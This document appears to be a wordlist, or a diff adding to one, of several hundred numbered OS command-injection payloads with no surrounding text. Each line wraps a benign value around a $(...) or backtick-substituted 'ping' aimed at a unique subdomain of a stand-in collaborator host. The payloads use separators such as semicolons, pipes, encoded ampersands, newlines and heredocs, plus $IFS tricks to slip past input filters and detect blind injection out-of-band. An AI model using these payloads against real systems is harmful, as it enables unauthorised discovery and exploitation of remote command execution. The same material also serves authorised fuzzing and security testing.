+invvvvv212.org"%0d%0d$(ping$IFS$9x1956.lookup.evilcollab.domain)%0d%0d1"
+invvvvv212.org'%0d%0d$(ping$IFS$9x1957.lookup.evilcollab.domain)%0d%0d1'
+1"%0d%0d$(ping$IFS$9x1958.lookup.evilcollab.domain)%0d%0d1"
+1'%0d%0d$(ping$IFS$9x1959.lookup.evilcollab.domain)%0d%0d1'
+foo"%0d%0d$(ping$IFS$9x1960.lookup.evilcollab.domain)%0d%0d1"
+foo'%0d%0d$(ping$IFS$9x1961.lookup.evilcollab.domain)%0d%0d1'
+invvvvv212.org%0d%0d$(ping$IFS$9x1962.lookup.evilcollab.domain)%0d%0dfoo
+1%0d%0d$(ping$IFS$9x1963.lookup.evilcollab.domain)%0d%0dfoo
+foo%0d%0d$(ping$IFS$9x1964.lookup.evilcollab.domain)%0d%0dfoo
+invvvvv212.org"%0d%0d$(ping$IFS$9x1965.lookup.evilcollab.domain)%0d%0dfoo"
+invvvvv212.org'%0d%0d$(ping$IFS$9x1966.lookup.evilcollab.domain)%0d%0dfoo'
+1"%0d%0d$(ping$IFS$9x1967.lookup.evilcollab.domain)%0d%0dfoo"
+1'%0d%0d$(ping$IFS$9x1968.lookup.evilcollab.domain)%0d%0dfoo'
+foo"%0d%0d$(ping$IFS$9x1969.lookup.evilcollab.domain)%0d%0dfoo"
+foo'%0d%0d$(ping$IFS$9x1970.lookup.evilcollab.domain)%0d%0dfoo'
+invvvvv212.org;$(ping$IFS$9x1971.lookup.evilcollab.domain);invvvvv212.org
+1;$(ping$IFS$9x1972.lookup.evilcollab.domain);invvvvv212.org
+foo;$(ping$IFS$9x1973.lookup.evilcollab.domain);invvvvv212.org
+invvvvv212.org";$(ping$IFS$9x1974.lookup.evilcollab.domain);invvvvv212.org"
+invvvvv212.org';$(ping$IFS$9x1975.lookup.evilcollab.domain);invvvvv212.org'
+1";$(ping$IFS$9x1976.lookup.evilcollab.domain);invvvvv212.org"
+1';$(ping$IFS$9x1977.lookup.evilcollab.domain);invvvvv212.org'
+foo";$(ping$IFS$9x1978.lookup.evilcollab.domain);invvvvv212.org"
+foo';$(ping$IFS$9x1979.lookup.evilcollab.domain);invvvvv212.org'
+invvvvv212.org;$(ping$IFS$9x1980.lookup.evilcollab.domain);1
+1;$(ping$IFS$9x1981.lookup.evilcollab.domain);1
+foo;$(ping$IFS$9x1982.lookup.evilcollab.domain);1
+invvvvv212.org";$(ping$IFS$9x1983.lookup.evilcollab.domain);1"
+invvvvv212.org';$(ping$IFS$9x1984.lookup.evilcollab.domain);1'
+1";$(ping$IFS$9x1985.lookup.evilcollab.domain);1"
+1';$(ping$IFS$9x1986.lookup.evilcollab.domain);1'
+foo";$(ping$IFS$9x1987.lookup.evilcollab.domain);1"
+foo';$(ping$IFS$9x1988.lookup.evilcollab.domain);1'
+invvvvv212.org;$(ping$IFS$9x1989.lookup.evilcollab.domain);foo
+1;$(ping$IFS$9x1990.lookup.evilcollab.domain);foo
+foo;$(ping$IFS$9x1991.lookup.evilcollab.domain);foo
+invvvvv212.org";$(ping$IFS$9x1992.lookup.evilcollab.domain);foo"
+invvvvv212.org';$(ping$IFS$9x1993.lookup.evilcollab.domain);foo'
+1";$(ping$IFS$9x1994.lookup.evilcollab.domain);foo"
+1';$(ping$IFS$9x1995.lookup.evilcollab.domain);foo'
+foo";$(ping$IFS$9x1996.lookup.evilcollab.domain);foo"
+foo';$(ping$IFS$9x1997.lookup.evilcollab.domain);foo'
+invvvvv212.org%26$(ping$IFS$9x1998.lookup.evilcollab.domain)%26invvvvv212.org
+1%26$(ping$IFS$9x1999.lookup.evilcollab.domain)%26invvvvv212.org
+foo%26$(ping$IFS$9x2000.lookup.evilcollab.domain)%26invvvvv212.org
+invvvvv212.org"%26$(ping$IFS$9x2001.lookup.evilcollab.domain)%26invvvvv212.org"
+invvvvv212.org'%26$(ping$IFS$9x2002.lookup.evilcollab.domain)%26invvvvv212.org'
+1"%26$(ping$IFS$9x2003.lookup.evilcollab.domain)%26invvvvv212.org"
+1'%26$(ping$IFS$9x2004.lookup.evilcollab.domain)%26invvvvv212.org'
+foo"%26$(ping$IFS$9x2005.lookup.evilcollab.domain)%26invvvvv212.org"
+foo'%26$(ping$IFS$9x2006.lookup.evilcollab.domain)%26invvvvv212.org'
+invvvvv212.org%26$(ping$IFS$9x2007.lookup.evilcollab.domain)%261
+1%26$(ping$IFS$9x2008.lookup.evilcollab.domain)%261
+foo%26$(ping$IFS$9x2009.lookup.evilcollab.domain)%261
+invvvvv212.org"%26$(ping$IFS$9x2010.lookup.evilcollab.domain)%261"
+invvvvv212.org'%26$(ping$IFS$9x2011.lookup.evilcollab.domain)%261'
+1"%26$(ping$IFS$9x2012.lookup.evilcollab.domain)%261"
+1'%26$(ping$IFS$9x2013.lookup.evilcollab.domain)%261'
+foo"%26$(ping$IFS$9x2014.lookup.evilcollab.domain)%261"
+foo'%26$(ping$IFS$9x2015.lookup.evilcollab.domain)%261'
+invvvvv212.org%26$(ping$IFS$9x2016.lookup.evilcollab.domain)%26foo
+1%26$(ping$IFS$9x2017.lookup.evilcollab.domain)%26foo
+foo%26$(ping$IFS$9x2018.lookup.evilcollab.domain)%26foo
+invvvvv212.org"%26$(ping$IFS$9x2019.lookup.evilcollab.domain)%26foo"
+invvvvv212.org'%26$(ping$IFS$9x2020.lookup.evilcollab.domain)%26foo'
+1"%26$(ping$IFS$9x2021.lookup.evilcollab.domain)%26foo"
+1'%26$(ping$IFS$9x2022.lookup.evilcollab.domain)%26foo'
+foo"%26$(ping$IFS$9x2023.lookup.evilcollab.domain)%26foo"
+foo'%26$(ping$IFS$9x2024.lookup.evilcollab.domain)%26foo'
+invvvvv212.org|$(ping$IFS$9x2025.lookup.evilcollab.domain)|invvvvv212.org
+1|$(ping$IFS$9x2026.lookup.evilcollab.domain)|invvvvv212.org
+foo|$(ping$IFS$9x2027.lookup.evilcollab.domain)|invvvvv212.org
+invvvvv212.org"|$(ping$IFS$9x2028.lookup.evilcollab.domain)|invvvvv212.org"
+invvvvv212.org'|$(ping$IFS$9x2029.lookup.evilcollab.domain)|invvvvv212.org'
+1"|$(ping$IFS$9x2030.lookup.evilcollab.domain)|invvvvv212.org"
+1'|$(ping$IFS$9x2031.lookup.evilcollab.domain)|invvvvv212.org'
+foo"|$(ping$IFS$9x2032.lookup.evilcollab.domain)|invvvvv212.org"
+foo'|$(ping$IFS$9x2033.lookup.evilcollab.domain)|invvvvv212.org'
+invvvvv212.org|$(ping$IFS$9x2034.lookup.evilcollab.domain)|1
+1|$(ping$IFS$9x2035.lookup.evilcollab.domain)|1
+foo|$(ping$IFS$9x2036.lookup.evilcollab.domain)|1
+invvvvv212.org"|$(ping$IFS$9x2037.lookup.evilcollab.domain)|1"
+invvvvv212.org'|$(ping$IFS$9x2038.lookup.evilcollab.domain)|1'
+1"|$(ping$IFS$9x2039.lookup.evilcollab.domain)|1"
+1'|$(ping$IFS$9x2040.lookup.evilcollab.domain)|1'
+foo"|$(ping$IFS$9x2041.lookup.evilcollab.domain)|1"
+foo'|$(ping$IFS$9x2042.lookup.evilcollab.domain)|1'
+invvvvv212.org|$(ping$IFS$9x2043.lookup.evilcollab.domain)|foo
+1|$(ping$IFS$9x2044.lookup.evilcollab.domain)|foo
+foo|$(ping$IFS$9x2045.lookup.evilcollab.domain)|foo
+invvvvv212.org"|$(ping$IFS$9x2046.lookup.evilcollab.domain)|foo"
+invvvvv212.org'|$(ping$IFS$9x2047.lookup.evilcollab.domain)|foo'
+1"|$(ping$IFS$9x2048.lookup.evilcollab.domain)|foo"
+1'|$(ping$IFS$9x2049.lookup.evilcollab.domain)|foo'
+foo"|$(ping$IFS$9x2050.lookup.evilcollab.domain)|foo"
+foo'|$(ping$IFS$9x2051.lookup.evilcollab.domain)|foo'
+invvvvv212.org<<D%0aD%0a$(ping$IFS$9x2052.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a$(ping$IFS$9x2053.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a$(ping$IFS$9x2054.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a$(ping$IFS$9x2055.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a$(ping$IFS$9x2056.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a$(ping$IFS$9x2057.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a$(ping$IFS$9x2058.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a$(ping$IFS$9x2059.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a$(ping$IFS$9x2060.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a$(ping$IFS$9x2061.lookup.evilcollab.domain)<<D%0aD%0a1
+1<<D%0aD%0a$(ping$IFS$9x2062.lookup.evilcollab.domain)<<D%0aD%0a1
+foo<<D%0aD%0a$(ping$IFS$9x2063.lookup.evilcollab.domain)<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a$(ping$IFS$9x2064.lookup.evilcollab.domain)<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a$(ping$IFS$9x2065.lookup.evilcollab.domain)<<D%0aD%0a1'
+1"<<D%0aD%0a$(ping$IFS$9x2066.lookup.evilcollab.domain)<<D%0aD%0a1"
+1'<<D%0aD%0a$(ping$IFS$9x2067.lookup.evilcollab.domain)<<D%0aD%0a1'
+foo"<<D%0aD%0a$(ping$IFS$9x2068.lookup.evilcollab.domain)<<D%0aD%0a1"
+foo'<<D%0aD%0a$(ping$IFS$9x2069.lookup.evilcollab.domain)<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a$(ping$IFS$9x2070.lookup.evilcollab.domain)<<D%0aD%0afoo
+1<<D%0aD%0a$(ping$IFS$9x2071.lookup.evilcollab.domain)<<D%0aD%0afoo
+foo<<D%0aD%0a$(ping$IFS$9x2072.lookup.evilcollab.domain)<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a$(ping$IFS$9x2073.lookup.evilcollab.domain)<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a$(ping$IFS$9x2074.lookup.evilcollab.domain)<<D%0aD%0afoo'
+1"<<D%0aD%0a$(ping$IFS$9x2075.lookup.evilcollab.domain)<<D%0aD%0afoo"
+1'<<D%0aD%0a$(ping$IFS$9x2076.lookup.evilcollab.domain)<<D%0aD%0afoo'
+foo"<<D%0aD%0a$(ping$IFS$9x2077.lookup.evilcollab.domain)<<D%0aD%0afoo"
+foo'<<D%0aD%0a$(ping$IFS$9x2078.lookup.evilcollab.domain)<<D%0aD%0afoo'
+invvvvv212.org%0a%0a`ping$IFS$9x2079.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+1%0a%0a`ping$IFS$9x2080.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+foo%0a%0a`ping$IFS$9x2081.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a`ping$IFS$9x2082.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a`ping$IFS$9x2083.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+1"%0a%0a`ping$IFS$9x2084.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+1'%0a%0a`ping$IFS$9x2085.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+foo"%0a%0a`ping$IFS$9x2086.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+foo'%0a%0a`ping$IFS$9x2087.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a`ping$IFS$9x2088.lookup.evilcollab.domain`%0a%0a1
+1%0a%0a`ping$IFS$9x2089.lookup.evilcollab.domain`%0a%0a1
+foo%0a%0a`ping$IFS$9x2090.lookup.evilcollab.domain`%0a%0a1
+invvvvv212.org"%0a%0a`ping$IFS$9x2091.lookup.evilcollab.domain`%0a%0a1"
+invvvvv212.org'%0a%0a`ping$IFS$9x2092.lookup.evilcollab.domain`%0a%0a1'
+1"%0a%0a`ping$IFS$9x2093.lookup.evilcollab.domain`%0a%0a1"
+1'%0a%0a`ping$IFS$9x2094.lookup.evilcollab.domain`%0a%0a1'
+foo"%0a%0a`ping$IFS$9x2095.lookup.evilcollab.domain`%0a%0a1"
+foo'%0a%0a`ping$IFS$9x2096.lookup.evilcollab.domain`%0a%0a1'
+invvvvv212.org%0a%0a`ping$IFS$9x2097.lookup.evilcollab.domain`%0a%0afoo
+1%0a%0a`ping$IFS$9x2098.lookup.evilcollab.domain`%0a%0afoo
+foo%0a%0a`ping$IFS$9x2099.lookup.evilcollab.domain`%0a%0afoo
+invvvvv212.org"%0a%0a`ping$IFS$9x2100.lookup.evilcollab.domain`%0a%0afoo"
+invvvvv212.org'%0a%0a`ping$IFS$9x2101.lookup.evilcollab.domain`%0a%0afoo'
+1"%0a%0a`ping$IFS$9x2102.lookup.evilcollab.domain`%0a%0afoo"
+1'%0a%0a`ping$IFS$9x2103.lookup.evilcollab.domain`%0a%0afoo'
+foo"%0a%0a`ping$IFS$9x2104.lookup.evilcollab.domain`%0a%0afoo"
+foo'%0a%0a`ping$IFS$9x2105.lookup.evilcollab.domain`%0a%0afoo'
+invvvvv212.org%0d%0d`ping$IFS$9x2106.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+1%0d%0d`ping$IFS$9x2107.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+foo%0d%0d`ping$IFS$9x2108.lookup.evilcollab.domain`%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d`ping$IFS$9x2109.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d`ping$IFS$9x2110.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+1"%0d%0d`ping$IFS$9x2111.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+1'%0d%0d`ping$IFS$9x2112.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+foo"%0d%0d`ping$IFS$9x2113.lookup.evilcollab.domain`%0d%0dinvvvvv212.org"
+foo'%0d%0d`ping$IFS$9x2114.lookup.evilcollab.domain`%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d`ping$IFS$9x2115.lookup.evilcollab.domain`%0d%0d1
+1%0d%0d`ping$IFS$9x2116.lookup.evilcollab.domain`%0d%0d1
+foo%0d%0d`ping$IFS$9x2117.lookup.evilcollab.domain`%0d%0d1
+invvvvv212.org"%0d%0d`ping$IFS$9x2118.lookup.evilcollab.domain`%0d%0d1"
+invvvvv212.org'%0d%0d`ping$IFS$9x2119.lookup.evilcollab.domain`%0d%0d1'
+1"%0d%0d`ping$IFS$9x2120.lookup.evilcollab.domain`%0d%0d1"
+1'%0d%0d`ping$IFS$9x2121.lookup.evilcollab.domain`%0d%0d1'
+foo"%0d%0d`ping$IFS$9x2122.lookup.evilcollab.domain`%0d%0d1"
+foo'%0d%0d`ping$IFS$9x2123.lookup.evilcollab.domain`%0d%0d1'
+invvvvv212.org%0d%0d`ping$IFS$9x2124.lookup.evilcollab.domain`%0d%0dfoo
+1%0d%0d`ping$IFS$9x2125.lookup.evilcollab.domain`%0d%0dfoo
+foo%0d%0d`ping$IFS$9x2126.lookup.evilcollab.domain`%0d%0dfoo
+invvvvv212.org"%0d%0d`ping$IFS$9x2127.lookup.evilcollab.domain`%0d%0dfoo"
+invvvvv212.org'%0d%0d`ping$IFS$9x2128.lookup.evilcollab.domain`%0d%0dfoo'
+1"%0d%0d`ping$IFS$9x2129.lookup.evilcollab.domain`%0d%0dfoo"
+1'%0d%0d`ping$IFS$9x2130.lookup.evilcollab.domain`%0d%0dfoo'
+foo"%0d%0d`ping$IFS$9x2131.lookup.evilcollab.domain`%0d%0dfoo"
+foo'%0d%0d`ping$IFS$9x2132.lookup.evilcollab.domain`%0d%0dfoo'
+invvvvv212.org;`ping$IFS$9x2133.lookup.evilcollab.domain`;invvvvv212.org
+1;`ping$IFS$9x2134.lookup.evilcollab.domain`;invvvvv212.org
+foo;`ping$IFS$9x2135.lookup.evilcollab.domain`;invvvvv212.org
+invvvvv212.org";`ping$IFS$9x2136.lookup.evilcollab.domain`;invvvvv212.org"
+invvvvv212.org';`ping$IFS$9x2137.lookup.evilcollab.domain`;invvvvv212.org'
+1";`ping$IFS$9x2138.lookup.evilcollab.domain`;invvvvv212.org"
+1';`ping$IFS$9x2139.lookup.evilcollab.domain`;invvvvv212.org'
+foo";`ping$IFS$9x2140.lookup.evilcollab.domain`;invvvvv212.org"
+foo';`ping$IFS$9x2141.lookup.evilcollab.domain`;invvvvv212.org'
+invvvvv212.org;`ping$IFS$9x2142.lookup.evilcollab.domain`;1
+1;`ping$IFS$9x2143.lookup.evilcollab.domain`;1
+foo;`ping$IFS$9x2144.lookup.evilcollab.domain`;1
+invvvvv212.org";`ping$IFS$9x2145.lookup.evilcollab.domain`;1"
+invvvvv212.org';`ping$IFS$9x2146.lookup.evilcollab.domain`;1'
+1";`ping$IFS$9x2147.lookup.evilcollab.domain`;1"
+1';`ping$IFS$9x2148.lookup.evilcollab.domain`;1'
+foo";`ping$IFS$9x2149.lookup.evilcollab.domain`;1"
+foo';`ping$IFS$9x2150.lookup.evilcollab.domain`;1'
+invvvvv212.org;`ping$IFS$9x2151.lookup.evilcollab.domain`;foo
+1;`ping$IFS$9x2152.lookup.evilcollab.domain`;foo
+foo;`ping$IFS$9x2153.lookup.evilcollab.domain`;foo
+invvvvv212.org";`ping$IFS$9x2154.lookup.evilcollab.domain`;foo"
+invvvvv212.org';`ping$IFS$9x2155.lookup.evilcollab.domain`;foo'
+1";`ping$IFS$9x2156.lookup.evilcollab.domain`;foo"
+1';`ping$IFS$9x2157.lookup.evilcollab.domain`;foo'
+foo";`ping$IFS$9x2158.lookup.evilcollab.domain`;foo"
+foo';`ping$IFS$9x2159.lookup.evilcollab.domain`;foo'
+invvvvv212.org%26`ping$IFS$9x2160.lookup.evilcollab.domain`%26invvvvv212.org
+1%26`ping$IFS$9x2161.lookup.evilcollab.domain`%26invvvvv212.org
+foo%26`ping$IFS$9x2162.lookup.evilcollab.domain`%26invvvvv212.org
+invvvvv212.org"%26`ping$IFS$9x2163.lookup.evilcollab.domain`%26invvvvv212.org"
+invvvvv212.org'%26`ping$IFS$9x2164.lookup.evilcollab.domain`%26invvvvv212.org'
+1"%26`ping$IFS$9x2165.lookup.evilcollab.domain`%26invvvvv212.org"
+1'%26`ping$IFS$9x2166.lookup.evilcollab.domain`%26invvvvv212.org'
+foo"%26`ping$IFS$9x2167.lookup.evilcollab.domain`%26invvvvv212.org"
+foo'%26`ping$IFS$9x2168.lookup.evilcollab.domain`%26invvvvv212.org'
+invvvvv212.org%26`ping$IFS$9x2169.lookup.evilcollab.domain`%261
+1%26`ping$IFS$9x2170.lookup.evilcollab.domain`%261
+foo%26`ping$IFS$9x2171.lookup.evilcollab.domain`%261
+invvvvv212.org"%26`ping$IFS$9x2172.lookup.evilcollab.domain`%261"
+invvvvv212.org'%26`ping$IFS$9x2173.lookup.evilcollab.domain`%261'
+1"%26`ping$IFS$9x2174.lookup.evilcollab.domain`%261"
+1'%26`ping$IFS$9x2175.lookup.evilcollab.domain`%261'
+foo"%26`ping$IFS$9x2176.lookup.evilcollab.domain`%261"
+foo'%26`ping$IFS$9x2177.lookup.evilcollab.domain`%261'
+invvvvv212.org%26`ping$IFS$9x2178.lookup.evilcollab.domain`%26foo
+1%26`ping$IFS$9x2179.lookup.evilcollab.domain`%26foo
+foo%26`ping$IFS$9x2180.lookup.evilcollab.domain`%26foo
+invvvvv212.org"%26`ping$IFS$9x2181.lookup.evilcollab.domain`%26foo"
+invvvvv212.org'%26`ping$IFS$9x2182.lookup.evilcollab.domain`%26foo'
+1"%26`ping$IFS$9x2183.lookup.evilcollab.domain`%26foo"
+1'%26`ping$IFS$9x2184.lookup.evilcollab.domain`%26foo'
+foo"%26`ping$IFS$9x2185.lookup.evilcollab.domain`%26foo"
+foo'%26`ping$IFS$9x2186.lookup.evilcollab.domain`%26foo'
+invvvvv212.org|`ping$IFS$9x2187.lookup.evilcollab.domain`|invvvvv212.org
+1|`ping$IFS$9x2188.lookup.evilcollab.domain`|invvvvv212.org
+foo|`ping$IFS$9x2189.lookup.evilcollab.domain`|invvvvv212.org
+invvvvv212.org"|`ping$IFS$9x2190.lookup.evilcollab.domain`|invvvvv212.org"
+invvvvv212.org'|`ping$IFS$9x2191.lookup.evilcollab.domain`|invvvvv212.org'
+1"|`ping$IFS$9x2192.lookup.evilcollab.domain`|invvvvv212.org"
+1'|`ping$IFS$9x2193.lookup.evilcollab.domain`|invvvvv212.org'
+foo"|`ping$IFS$9x2194.lookup.evilcollab.domain`|invvvvv212.org"
+foo'|`ping$IFS$9x2195.lookup.evilcollab.domain`|invvvvv212.org'
+invvvvv212.org|`ping$IFS$9x2196.lookup.evilcollab.domain`|1
+1|`ping$IFS$9x2197.lookup.evilcollab.domain`|1
+foo|`ping$IFS$9x2198.lookup.evilcollab.domain`|1
+invvvvv212.org"|`ping$IFS$9x2199.lookup.evilcollab.domain`|1"
+invvvvv212.org'|`ping$IFS$9x2200.lookup.evilcollab.domain`|1'
+1"|`ping$IFS$9x2201.lookup.evilcollab.domain`|1"
+1'|`ping$IFS$9x2202.lookup.evilcollab.domain`|1'
+foo"|`ping$IFS$9x2203.lookup.evilcollab.domain`|1"
+foo'|`ping$IFS$9x2204.lookup.evilcollab.domain`|1'
+invvvvv212.org|`ping$IFS$9x2205.lookup.evilcollab.domain`|foo
+1|`ping$IFS$9x2206.lookup.evilcollab.domain`|foo
+foo|`ping$IFS$9x2207.lookup.evilcollab.domain`|foo
+invvvvv212.org"|`ping$IFS$9x2208.lookup.evilcollab.domain`|foo"
+invvvvv212.org'|`ping$IFS$9x2209.lookup.evilcollab.domain`|foo'
+1"|`ping$IFS$9x2210.lookup.evilcollab.domain`|foo"
+1'|`ping$IFS$9x2211.lookup.evilcollab.domain`|foo'
+foo"|`ping$IFS$9x2212.lookup.evilcollab.domain`|foo"
+foo'|`ping$IFS$9x2213.lookup.evilcollab.domain`|foo'
+invvvvv212.org<<D%0aD%0a`ping$IFS$9x2214.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a`ping$IFS$9x2215.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a`ping$IFS$9x2216.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a`ping$IFS$9x2217.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a`ping$IFS$9x2218.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a`ping$IFS$9x2219.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a`ping$IFS$9x2220.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a`ping$IFS$9x2221.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a`ping$IFS$9x2222.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a`ping$IFS$9x2223.lookup.evilcollab.domain`<<D%0aD%0a1
+1<<D%0aD%0a`ping$IFS$9x2224.lookup.evilcollab.domain`<<D%0aD%0a1
+foo<<D%0aD%0a`ping$IFS$9x2225.lookup.evilcollab.domain`<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a`ping$IFS$9x2226.lookup.evilcollab.domain`<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a`ping$IFS$9x2227.lookup.evilcollab.domain`<<D%0aD%0a1'
+1"<<D%0aD%0a`ping$IFS$9x2228.lookup.evilcollab.domain`<<D%0aD%0a1"
+1'<<D%0aD%0a`ping$IFS$9x2229.lookup.evilcollab.domain`<<D%0aD%0a1'
+foo"<<D%0aD%0a`ping$IFS$9x2230.lookup.evilcollab.domain`<<D%0aD%0a1"
+foo'<<D%0aD%0a`ping$IFS$9x2231.lookup.evilcollab.domain`<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a`ping$IFS$9x2232.lookup.evilcollab.domain`<<D%0aD%0afoo
+1<<D%0aD%0a`ping$IFS$9x2233.lookup.evilcollab.domain`<<D%0aD%0afoo
+foo<<D%0aD%0a`ping$IFS$9x2234.lookup.evilcollab.domain`<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a`ping$IFS$9x2235.lookup.evilcollab.domain`<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a`ping$IFS$9x2236.lookup.evilcollab.domain`<<D%0aD%0afoo'
+1"<<D%0aD%0a`ping$IFS$9x2237.lookup.evilcollab.domain`<<D%0aD%0afoo"
+1'<<D%0aD%0a`ping$IFS$9x2238.lookup.evilcollab.domain`<<D%0aD%0afoo'
+foo"<<D%0aD%0a`ping$IFS$9x2239.lookup.evilcollab.domain`<<D%0aD%0afoo"
+foo'<<D%0aD%0a`ping$IFS$9x2240.lookup.evilcollab.domain`<<D%0aD%0afoo'
